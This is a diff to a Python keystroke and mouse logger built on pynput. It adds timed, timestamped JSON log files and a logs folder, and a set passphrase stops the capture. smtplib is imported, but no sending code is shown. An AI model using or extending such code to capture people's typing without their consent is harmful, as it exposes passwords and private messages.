@@ -8,6 +8,7 @@ import json
 import os
 from pynput import keyboard, mouse
 import smtplib
+import threading
 
 """
     MISCELLANEOUS
@@ -15,7 +16,7 @@ import smtplib
 
 def timestamp():
     right_now = datetime.now()
-    return right_now.strftime('%d/%m/%Y - %H:%M')
+    return right_now.strftime('%d-%m-%Y %H%M-%S')
 
 def sort_dict_descending_keys(dictionary):
     return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)
@@ -59,6 +60,7 @@ class Monitor:
     passphrase = "I'm fishing in the river champion!"
 
     def __init__(self):
+        self.log_interval = 2 
         # state variables
         self.logs = list()
         self.text = str()
@@ -66,6 +68,14 @@ class Monitor:
         # listeners
         self.keys = keyboard.Listener(on_press=self.on_press)
         self.mice = mouse.Listener(on_click=self.on_click)
+    
+    def create_log(self):
+        print(timestamp())
+        # for now we log even if there was no log contents
+        log_name = f'logs/{timestamp()}.json'
+        with open(log_name, 'w') as log_file:
+            log_file.write(json.dumps(self.logs, indent=4))
+        self.logs = list()
     
     def record_raw_input(self, input_dict):
         # only record text if it's not empty
@@ -75,7 +85,7 @@ class Monitor:
         self.logs.append(input_dict)
 
     def on_press(self, key):
-        # handle the None case and all falsey keys
+        # handle the None case and all falsey keyboard.Keys
         if not key:
             return
 
@@ -83,6 +93,7 @@ class Monitor:
             if self.text:
                 self.logs.append({'o' : self.text})
             self.mice.stop()
+            self.create_log()
             return False
         
         try:
@@ -97,14 +108,23 @@ class Monitor:
             self.record_raw_input({'m' : button.name.upper()})
 
     def run(self):
+        # create the logs folder if it does not exist
+        try:
+            os.mkdir('logs')
+        except FileExistsError:
+            pass
+
         self.keys.start()
         self.mice.start()
+
+        # once the listeners are ready start the timer
+        timer = threading.Timer(interval=self.log_interval, function=self.create_log)
+        timer.daemon = True
+        timer.start()
+        timer.join()        
         
-        print('ready!')
         self.keys.join()
         self.mice.join()
-        with open(os.path.expanduser('~/logs.json'), 'w') as f:
-            f.write(json.dumps(self.logs, indent=4))
         
 def main():
     monitor = Monitor()
